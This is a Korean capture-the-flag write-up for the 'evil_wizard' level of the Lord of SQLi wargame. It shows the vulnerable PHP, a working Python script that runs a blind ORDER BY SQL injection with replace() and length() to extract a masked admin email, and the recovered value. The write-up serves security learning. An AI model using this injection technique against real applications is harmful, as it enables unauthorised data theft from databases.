# evil wizard

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|proc|union|sleep|benchmark/i', $_GET[order])) exit("No Hack ~_~");
  $query = "select id,email,score from prob_evil_wizard where 1 order by {$_GET[order]}"; // same with hell_fire? really?
  echo "<table border=1><tr><th>id</th><th>email</th><th>score</th>";
  $rows = mysqli_query($db,$query);
  while(($result = mysqli_fetch_array($rows))){
    if($result['id'] == "admin") $result['email'] = "**************";
    echo "<tr><td>{$result[id]}</td><td>{$result[email]}</td><td>{$result[score]}</td></tr>";
  }
  echo "</table><hr>query : <strong>{$query}</strong><hr>";

  $_GET[email] = addslashes($_GET[email]);
  $query = "select email from prob_evil_wizard where id='admin' and email='{$_GET[email]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['email']) && ($result['email'] === $_GET['email'])) solve("evil_wizard");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- GET 파라미터 `order`을 받고, 쿼리 속 마지막 `order by`뒤에 붙인다.
- 쿼리 결과를 테이블로 보여주는데, admin의 email은 공개하지 않는다.
- 정확한 admin email값을 알아내면 해결된다.   
- 이전 문제와 비교하면 `union`, `sleep`, `benchmark` 필터링이 추가되었는데, 내가 해결한 방식으로는 제약이 없다.   

## 3. Solution
이전 문제, <a href="./../hell_fire/hell_fire.md">hell_fire</a>와 동일한 방법으로 해결하였다.   

자세한 설명은 위 링크를 통해 확인하도록 하고, 간단하게 설명하자면    
`order by` 뒤에 함수를 연결시킬 수 있다는 점에서   
`length`, `replace`함수를 이용하여 rubiya email 값을 하나하나 바꿔가며 admin email의 길이와 값을 찾아내었다.    

그리고 최종적으로 대소문자 확인을 위해 `replace`함수를 통해 나온 admin email 값을 다시한번 돌렸다.    


코드는 다음과 같다.
```python
import requests
import binascii

cookie = {'PHPSESSID' : '~~~~'}

def str2hex(string_1):
    return binascii.hexlify(string_1.encode('utf-8')).decode('utf-8')



rubiya_email = "rubiya805@gmail.com"
for i in range(1,101):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?\
            order=length(replace(email,0x%s,\'%s\'))" % (str2hex(rubiya_email), '!'*i)
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr>" in res.text:
        email_len = i-1
        print("Length of pw : %d" % email_len)
        break

        
        
tmp_admin_email = ""
for i in range(email_len):
    for j in range(32,1000):
        hex_rubiya = str2hex(tmp_admin_email+chr(j))
        url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?\
                order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), hex_rubiya)
        res = requests.get(url, cookies=cookie)

        if "<tr><td>admin</td><td>**************</td><td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr>" in res.text:
            tmp_admin_email += chr(j-1)
            print("email(%d) : %s" % (i+1, tmp_admin_email))
            break
            

            
final_admin_email = ""
print("-----------------------------------------------")
print("| admin email | ", end="")
for i in range(email_len):
    url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php?\
            order=replace(email,0x%s,0x%s)" % (str2hex(rubiya_email), str2hex(final_admin_email + tmp_admin_email[i].upper()))
    res = requests.get(url, cookies=cookie)
    
    if "<tr><td>admin</td><td>**************</td><td>50</td></tr><tr><td>rubiya</td><td>rubiya805@gmail.com</td><td>100</td></tr>" in res.text:
        final_admin_email += tmp_admin_email[i].upper()
    
    else:
        final_admin_email += tmp_admin_email[i].lower()
    
    print("%s" % (final_admin_email[i]), end="")
    
print("\n-----------------------------------------------")
```   



결과는 다음과 같다.   
```
Length of pw : 30
email(1) : A
email(2) : AA
email(3) : AAS
email(4) : AASU
email(5) : AASUP
email(6) : AASUP3
email(7) : AASUP3R
email(8) : AASUP3R_
email(9) : AASUP3R_S
email(10) : AASUP3R_SE
email(11) : AASUP3R_SEC
email(12) : AASUP3R_SECU
email(13) : AASUP3R_SECUR
email(14) : AASUP3R_SECURE
email(15) : AASUP3R_SECURE_
email(16) : AASUP3R_SECURE_E
email(17) : AASUP3R_SECURE_EM
email(18) : AASUP3R_SECURE_EMA
email(19) : AASUP3R_SECURE_EMAI
email(20) : AASUP3R_SECURE_EMAIL
email(21) : AASUP3R_SECURE_EMAIL@
email(22) : AASUP3R_SECURE_EMAIL@E
email(23) : AASUP3R_SECURE_EMAIL@EM
email(24) : AASUP3R_SECURE_EMAIL@EMA
email(25) : AASUP3R_SECURE_EMAIL@EMAI
email(26) : AASUP3R_SECURE_EMAIL@EMAI1
email(27) : AASUP3R_SECURE_EMAIL@EMAI1.
email(28) : AASUP3R_SECURE_EMAIL@EMAI1.C
email(29) : AASUP3R_SECURE_EMAIL@EMAI1.CO
email(30) : AASUP3R_SECURE_EMAIL@EMAI1.COM
-----------------------------------------------
| admin email | aasup3r_secure_email@emai1.com
-----------------------------------------------
```   


나온 값, `aasup3r_secure_email@emai1.com`을 GET 파라미터 `email`에 넣어주면 문제가 해결된다.   
변수명 | 값
---|---
`email` | aasup3r_secure_email@emai1.com